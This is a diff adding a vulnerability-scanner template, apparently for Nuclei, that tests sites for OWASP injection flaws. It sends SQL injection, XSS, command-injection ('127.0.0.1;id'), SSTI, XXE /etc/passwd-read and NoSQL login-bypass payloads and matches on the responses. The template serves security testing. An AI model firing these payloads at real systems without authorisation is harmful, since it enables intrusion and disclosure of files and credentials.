@@ -1,0 +1,161 @@
+id: a03-injection
+
+info:
+  name: A03:2021 - Injection
+  author: legioncyber
+  severity: critical
+  description: |
+    Tests for injection vulnerabilities including SQL injection indicators in error messages,
+    reflected XSS, command injection via common parameters, and Server-Side Template Injection (SSTI).
+    Maps to OWASP Top 10 2021 A03.
+  tags: owasp,a03,injection,sqli,xss,ssti,command-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+    owasp-id: A03-2021
+
+requests:
+  # -----------------------------------------------------------------------
+  # SQL injection error-based detection
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q='"
+      - "{{BaseURL}}/product?id=1'"
+      - "{{BaseURL}}/user?id=1'"
+      - "{{BaseURL}}/item?sku=1'"
+      - "{{BaseURL}}/api/search?query='"
+      - "{{BaseURL}}/api/data?id=1%27"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)SQL syntax.*MySQL"
+          - "(?i)Warning.*mysql_.*"
+          - "(?i)MySqlException"
+          - "(?i)valid MySQL result"
+          - "(?i)ORA-[0-9]{4,}"
+          - "(?i)Microsoft OLE DB Provider for SQL Server"
+          - "(?i)Unclosed quotation mark after the character string"
+          - "(?i)quoted string not properly terminated"
+          - "(?i)pg_query\\(\\).*ERROR"
+          - "(?i)SQLite.*error"
+          - "(?i)SQLSTATE\\[42"
+          - "(?i)Syntax error.*SQL"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Reflected XSS
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=<script>alert(1)</script>"
+      - "{{BaseURL}}/search?q=<img+src=x+onerror=alert(1)>"
+      - "{{BaseURL}}/error?msg=<svg/onload=alert(1)>"
+      - "{{BaseURL}}/?redirect=javascript:alert(1)"
+      - "{{BaseURL}}/api/search?term=<script>alert(document.domain)</script>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg/onload=alert(1)>"
+          - "javascript:alert(1)"
+        condition: or
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Command injection via common parameters
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/ping?host=127.0.0.1;id"
+      - "{{BaseURL}}/lookup?domain=example.com;id"
+      - "{{BaseURL}}/api/exec?cmd=whoami"
+      - "{{BaseURL}}/nslookup?host=127.0.0.1|id"
+      - "{{BaseURL}}/traceroute?target=127.0.0.1%3Bid"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+\\)"
+          - "root:.*:0:0:"
+          - "www-data"
+          - "Windows IP Configuration"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # SSTI — Server-Side Template Injection
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q={{'{{'}}7*7{{'}}'}}"
+      - "{{BaseURL}}/render?template=7*7"
+      - "{{BaseURL}}/preview?content=${7*7}"
+      - "{{BaseURL}}/page?name=<%= 7*7 %>"
+      - "{{BaseURL}}/api/render?input=#{7*7}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "49"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # XXE — XML External Entity
+  # -----------------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/upload/xml"
+      - "{{BaseURL}}/data/import"
+      - "{{BaseURL}}/api/parse"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <data><item>&xxe;</item></data>
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:/usr/sbin"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # NoSQL injection (MongoDB operators)
+  # -----------------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"username": {"$gt": ""}, "password": {"$gt": ""}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "token"
+          - "access_token"
+          - "jwt"
+          - "dashboard"
+          - "welcome"
+        condition: or
+        part: body
+        case-insensitive: true
